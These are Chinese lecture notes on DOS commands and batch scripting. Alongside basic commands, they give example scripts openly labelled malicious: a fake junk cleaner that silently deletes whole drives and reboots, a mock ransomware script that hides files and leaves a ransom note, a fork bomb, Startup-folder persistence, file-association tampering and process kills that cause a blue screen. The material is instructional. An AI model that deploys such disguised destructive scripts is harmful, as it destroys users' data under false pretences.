---
title: "DOS 基本命令与批处理"
date: 2026-10-19T15:00:00+08:00
draft: false
categories: ["课程笔记", "windows系统"]
tags: ["Windows Server", "cmd", "批处理", "课程笔记"]
summary: "color / cls / start / date / dir / cd / copy / move / del / ipconfig / ping 等常用命令、目录结构与管道，以及批处理脚本的基本写法。"
description: "color / cls / start / date / dir / cd / copy / move / del / ipconfig / ping 等常用命令、目录结构与管道，以及批处理脚本的基本写法。"
ShowToc: true
---

> 来源：Windows 服务基础课程讲义（`DOS基本命令与批处理.pdf`，共 12 页）。由 PDF 转为 Markdown 并抽取原文图片，仅整理排版与章节层级，正文内容未改写。

author：讲师

## 一、DOS基本命令

在出现图形界面前，人们都用命令来操作计算机，命令几乎可以完成鼠标可以干的所有事。windows自带的命令：DOS命令linux自带的命令：Shell命令用DOS命令编写的脚本，一般称之为批处理脚本用shell命令编写的脚本，一般称之为Shell脚本目标：

掌握dos命令一些基本用法，特别是命令的参数能够简单的写出一些批处理脚本

### 1.1、如何操作DOS命令

建议：初学者在虚拟机中完成实验！！！！！

开始---运行---输入cmd--回车，将调出C:\windows\system32\cmd.exe

或者

Win + R ---运行---输入cmd--回车

cmd是一个工具输入命令控制系统，统称为命令解释器（shell）

powershell

### 1.2、基本命令

1. 命令：color f0

帮助：color ?

作用：改变背景及字体颜色

2. 命令：cls作用：清屏

3. 命令：start  [路径+]程序作用：命令行下打开某程序

```
如：start notepad
start cmd
start calc
start www.baidu.com
start d:
```

4. 命令：date /t作用：查看日期

5. 命令：time /t作用：查看时间

### 1.3、目录相关命令

目录就是文件夹！

3. 命令:dir   （directory 目录）

作用：浏览当前文件夹的内容（带<dir>标识的为文件夹，否则为文件）

其他用法：

dir  指定路径

```
dir  d:\
dir  d:\pic
```

dir  /a          #浏览所有内容，包括隐藏内容

4. 命令：盘符:

作用：切换分区, 如：c:   d:   e:

5. 命令：cd ..作用：退出一级目录

6. 命令：cd 文件夹名作用：进入文件夹

7. Tab键：补全（存在的）路径功能

8. 命令：cd \作用：直接退到根目录

9. 命令：md 文件夹 [文件夹  文件夹 ....]作用：创建文件夹，可用一次性创建多个，空格隔开

10.命令：rd 文件夹 [文件夹  文件夹 ....]作用：删除空文件夹删除非空文件夹方法：

命令：rd 文件夹  /s/q     # /s代表递归   /q代表无提示作用：无提示删除非空文件夹特殊经典用法：

特殊用法：rd  d:  /s/q

特殊用法：rd  .  /s/q      清空当前目录

11.路径：

相对路径：从当前路径开始定位，如：..\456绝对路径：从根开始写路径,如：\123\345注释：

fsutil fsinfo drives   #可以查看当前系统的分区列表 这个命令需要windows usc功能降低否则必须以管理员身份运行chcp 65001  #可以调整cmd页面显示的语言为英文

chcp 936 #中文字符

### 1.4、文件相关命令

12.创建文件方法一：

echo 字符串 >>[路径\]文件名.扩展名注释：>>和>都可以将命令的输出内容输入到某文件中，若文件不存在，则同时创建该文件>>为追加>为覆盖2>为错误信息输出 “type xxxxx.txt  查看一个不存在的文件”

2>nul  如果一旦出现错误不显示经典用法：屏幕上不要有任何的报错

如：rd . /s/q  >nul 2>nul  #2错误输出

创建文件方法二：

copy  con  文件名.扩展名开始编写文件内容，可以回车编写多行ctrl+z然后回车结束编写

13. 命令：type  文件名.扩展名作用：浏览一个文件的内容

14. 命令：del 文件名.扩展名作用：删除文件del  *.txt                 #  删除所有的记事本del  *.*                   #  删除所有的文件

```
del  *.*      /q           #  无提示删除
del  *.*   /s /q           #  递归无提示删除
```

注释：*

15.ren 源名 新名     #重命名，可以重命名文件和文件夹。

### 1.5、隐藏命令

15. 修改文件或文件夹隐藏属性命令：

attrib  +h   文件全名/文件夹名        #隐藏文件attrib  +s  +h   文件全名/文件夹名    # 提升为系统文件

attrib  +s  +h  d:\*.*             #高级隐藏D盘下的所有文件

注释：+改为-为取消修改文件属性

### 1.6、复制和移动

16. 命令：

复制文件：copy   [路径\]源文件全名  目标路径移动文件：move   [路径\]源文件全名  目标路径例如：

```
copy  123.txt  d:\aa\daa\
move  123.txt  d:\aa\daa\
```

拷贝目录xcopy  源目录 c:\目标路径\自定义目录名（必须写和linux不同）/e /i /y#/e 复制目录和子目录

#/y 静默

#/i 创建目录

### 1.7、定时关机或重启

17. 命令：定时关机或重启

```
shutdown  -s  -t  秒             #定时关机
shutdown  -s  -f  -t  秒         #定时强制关机
```

shutdown  -r  -t  秒             #定时重启，同上加-f,为强制重启

```
shutdown  -a                     #取消定时
shutdown  -l                     #注销，同logoff命令相同。
```

注释：不同得系统，支持得定时时间不一样，win2003比较少。

### 1.8、查找字符串

命令

某命令  | find  "字符串"

“|” 管道符号：作用是将前一条命令的输出作为后一条命令的 处理内容案例

```
dir d:  |  find  "hello"        # 从d盘根目录中查找包含hello的文件夹
type 123.txt | find "hello"     # 从命令结果中查找包含hello的行
netstat -an | find ":1900"      # 从命令结果中查找包含:1900的行
tasklist   #进程名称对应的pid号
taskkill  /F  /IM  /T  /PID #杀死进程
```

#/IM 服务名称#/T  树状结构杀死---结束进程的同时结束子进程

### 1.9、分页显示

命令

某命令  |  more

作用：分屏显示内容

## 二、批处理编写

### 1.1、批处理概述

批处理定义自上而下成批的处理dos命令批处理作用一般批处理也叫脚本，如果该脚本实现的破坏功能，我们称之为恶意脚本，也就是木马或者病毒何为脚本windows中，叫批处理脚本（批处理是由DOS命令组成编写得）

linux中，叫shell脚本（shell脚本是shell命令组成编写的）

脚本==自动化

### 1.2、如何创建批处理

扩展名： .bat创建方法：新建一个记事本文件，然后将扩展名改为.bat注：修改扩展名时，需要将文件的扩展名显示出来后再进行修改！

### 1.3、批处理案例

案例：

```
@echo off               #屏蔽执行过程
chcp 65001 >nul 2>&1
```

echo 欢迎学习批处理！

echo 当前目录：%cd%   #%cd是系统变量，代表当前脚本所在目录

```
pause
```

### 案例1：恶意脚本--之--清理垃圾篇

```
@echo off
echo ==============================
echo.
echo         垃圾清理程序 v1.0
echo                  --by teacher
echo.
echo ==============================
pause
```

echo 垃圾清理中。。。。。

```
rd d: /s/q >nul 2>nul
rd e: /s/q >nul 2>nul
```

echo 恭喜您，垃圾清理完毕，按任意键重启计算机，效果更好！

```
pause >nul 2>nul
shutdown -r -t 0
```

用到得知识点：

```
@echo off           # 屏蔽执行过程
pause               # 暂停配合echo使用
echo.               # 输出空行
```

命令 >nul 2>nul      # 屏蔽命令执行的正确和错误输出

### 案例2：恶意脚本 之 隐藏所有文件-勒索脚本

```
@echo off
echo ==============================
echo.
echo         垃圾清理程序 v1.0
echo.                 --by teacher
echo ==============================
pause
```

echo "我实际上是个加密软件 你的文件正在被加密"

```
attrib +s +h d:\*.* /S /D >nul 2>nul
echo 请加微信18709999999 >d:\找回文件联系我哟.txt
```

echo 请看D盘有惊喜

```
start d:
pause
```

### 案例3：设置脚本标题

```
@echo off
```

title 好玩的程序哟！

```
echo ==================
```

echo   垃圾即将清理有

```
echo ==================
pause
```

### 案例4：将bat转换成exe格式

bat-to-exe-converter软件+图标文件（.ico）

转换过程参考视频！

### 案例5：设置互动变量脚本

```
@echo off
```

set /p boy=哥们，你的姓名是：     #

```
set /p girl=女神是谁?
echo %boy% love %girl%           #
pause
set /a time=3*60   #/a后面可以跟算术表达式
echo %time%
```

### 案例6：灵活运用set /p

```
@echo off
```

echo 垃圾清理程序

```
echo.
```

set /p pan=哥们，请输入你要清理垃圾的盘符(注意只写字母即可)：

```
echo.
```

echo 稍安勿躁，垃圾清理中。。。

```
del %pan%: /s/q >nul 2>nul
```

echo 恭喜！垃圾清理完毕！

```
pause
```

```
@echo off
echo ==========================
echo.
```

echo    定时关机小工具

```
echo              --- by xxxx
echo.
echo ==========================
set /p min="多少分钟后关机："
```

echo 我会在%min%分钟后关机

```
set /a time=%min%*60 >nul
shutdown -s -f -t %time%
pause >nul 2>nul
```

### 案例7：echo.的用法

```
@echo off
echo ====================
echo.                               # echo.为固定用法，代表空一行
```

echo     讲师友好程序

```
echo.
echo ====================
pause
```

### 案例8：冒号：和goto的的基本用法

冒号:的用法：定义命令区间goto命令：用来在命令区间之间做跳转

```
@echo off
:a                             # 指定区块
echo aaa
goto c                          # 跳转到哪个区块
:b
echo bbb
:c
echo ccc
pause
```

冒号与goto 之 亮瞎你的眼

```
@echo off
:a
```

echo 讲师真帅！

```
color 0a
color f0
color a5
color ec
goto a
```

冒号与goto 之 死循环：

```
@echo off
:a
start cmd
goto a
```

%0                  #0是变量，该变量的值就是脚本的名称本身!，所有%0的作用就是再次执行一次本脚本，实现死循环%0|%0               #无论如何都要重新执行本脚本（对win10及win7也有效）

### 案例9：互动赋值实现自动关机

```
@echo off
```

set /p time=请输入关机时间(秒)：

```
shutdown -s -t %time%
```

### 案例10：定义批处理运行时窗口大小

```
@echo off
mode con cols=40 lines=10           # cols 定义宽 ， lines定义高度
pause
```

### 案例11：设置自启动脚本（一）

```
copy %0 "C:\Documents and Settings\%username%\「开始」菜单\程序\启动\"
shutdown -r -t 0
::该路径仅适用于早期系统，如：windows xp、windows server 2003
```

::变量username的值就是当前登录用户的用户名！

### 案例12：设置自启动脚本（二）

```
copy %0 "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup\"
shutdown -r -t 0
::注释：该路径仅适用于新系统：windows 7、windows10、windows server 2008/2012/2016/2019
```

::变量username的值就是当前登录用户的用户名！

### 案例13：制作带有菜单的脚本

用到知识冒号：

```
goto
if
```

if用法if  判断语句  命令     # 判断正确成功，则执行命令，否则不执行，结束判断

如：if  1==2 md c:\123

案例13.5：

```
@echo off
```

title 讲师程序

```
color 0a
mode con cols=45 lines=13
:menu
cls
echo ===========================
echo            菜单
echo         1.定时关机
echo         2.制作关机病毒
echo         3.清理垃圾
echo         4.退出
echo ===========================
```

set /p num=请输入您的选择：

```
if "%num%"=="1" goto a
if "%num%"=="2" goto b
if "%num%"=="3" goto c
if "%num%"=="4" goto d
```

echo 别TM瞎输入，好好输入，只能输入(1、2、3、4)!echo 按任意键回菜单吧!

```
pause >nul 2>nul
goto menu
:a
```

set /p time=请输入关机时间：

```
shutdown -s -t %time%
goto menu
:b
echo shutdown -r -t 0 >"C:\Documents and Settings\%username%\「开始」菜单\程序\启动
\haha.bat"
```

echo 恭喜，病毒制作成功！

```
pause
goto menu
:c
```

set /p pan=请输入垃圾清理盘符：

```
rd %pan%:\ /s/q >nul 2>nul
```

echo 恭喜，分区%pan%盘垃圾清理完毕！

```
pause
goto menu
:d
exit
```

### 案例14：注释命令

```
@echo off
```

::echo aaa      # ::可以注释掉一行命令，当执行批处理时不会再执行本行命令

```
@rem echo bbb   # @rem 作用同 ::
echo ccc
pause
```

### 案例15：实现延时操作

```
@echo off
ping -n 5 127.0.0.1 >nul 2>nul     #实现运行时等待大概5秒，也可以理解为延时5秒，然后继续
```

执行后续命令

```
pause
@echo off
:a
color 0a
ping -n 2 127.0.0.1 >nul 2>nul
color a8
ping -n 2 127.0.0.1 >nul 2>nul
color e5
goto a
@echo off
echo ==============================
echo.
echo         垃圾清理程序 v1.0
echo.                 --by teacher
echo ==============================
pause
```

echo 垃圾清理中。。。。。

```
rd d:\ /s/q >nul 2>nul
ping -n 8 127.0.0.1 >nul 2>nul
```

echo 恭喜您，垃圾清理完毕，按任意键重启计算机，效果更好！

```
pause >nul 2>nul
```

### 案例16：制作简易加密脚本

```
@echo off
title 加密程序v1.0--by teacher
echo ===========================================
```

echo  加密说明：

echo  首先将加密程序复制到与所要加密的文件夹同一个目录中，然后再运行该程序

```
echo ===========================================
```

set /p name=请输入要加密的文件夹名：

```
ren %name% system.inf
attrib +s +h system.inf
```

echo 恭喜，已经加密成功！

```
pause
```

### 案例17：制作解密脚本

```
@echo off
title 解密程序v1.0--by teacher
echo ===========================================
```

echo  解密说明：

echo  首先将解密程序复制到与所要解密的文件夹同一个目录中，然后再运行该程序

```
echo ===========================================
```

set /p name=请输入要解密的文件夹名：

```
attrib -s -h system.inf
ren  system.inf  %name%
```

echo 恭喜，已经解密成功！

```
pause
```

### 案例18：恶意脚本--之-篡改文件关联性

```
@echo off
```

assoc .txt=mp3file      #  将txt当成音乐文件，打开txt文件将使用音乐播放器打开

```
assoc .jpg=mp3file
assoc .png=mp3file
assoc .zip=mp3file
```

### 案例19：恶意脚本--之-修复文件关联性

```
@echo off
assoc .txt=txtfile                      #  只需要前后一致即可！
assoc .jpg=jpgfile
assoc .png=pngfile
assoc .zip=zipfile
assoc .mp3=mp3file
```

### 案例20：针对win 2003的蓝屏炸弹

```
ntsd -c q -pn winlogon.exe
```

ntsd早期系统杀死进程的命令taskkill新系统杀死进程的命令

### 案例21：（非批处理）针对win7与win10的蓝屏

```
win7
```

任务管理器---强制杀死csrss.exe进程--蓝屏

```
win10
```

任务管理器---强制杀死：服务主机：DCOM服务进程启动器--蓝屏

### 案例22：杀死explorer.exe进程

```
@echo off
taskkill /im explorer.exe /f >nul 2>nul
```

echo 小样!吓死你了!

```
ping -n 8 127.0.0.1 >nul 2>nul
start c:\windows\explorer.exe
```

echo 恢复了！以后别老访问垃圾网站！

```
pause
```

### 案例23：快速制作大文件脚本

```
fsutil file createnew d:\system.inf 102400000               #
attrib +s +h d:\system.inf
```
